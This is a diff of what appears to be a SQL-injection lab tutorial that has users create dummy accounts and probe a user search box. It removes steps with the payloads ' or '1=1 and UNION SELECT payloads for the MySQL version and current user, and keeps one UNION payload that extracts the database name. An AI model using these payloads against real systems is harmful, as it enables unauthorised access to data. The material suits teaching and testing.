@@ -17,26 +17,7 @@ Note: To fetch server ip type in serverip in a new terminal
 
 Step 5: Create some dummy users
 
-Step 6: In the search bar search for any user you have created based on first name
 
-Step 7: Now test for SQL Injection payload
-
-' or '1=1Copy
-| This should return all the users you have created
-
-Step 8: You can also try with these payloads
-
-To get mysql version
-
-a' UNION ALL SELECT null,version(),null,null'Copy
-You will see a mysql version under the header First Name
-
-To get the logged in mysql user
-
-a' UNION ALL SELECT null,CURRENT_USER(),null,null'Copy
-You will see the current mysql user under the header First Name
-
-To get the current database
 
 a' UNION ALL SELECT null,DATABASE(),null,null'Copy
 You will see the database name under the header First Name
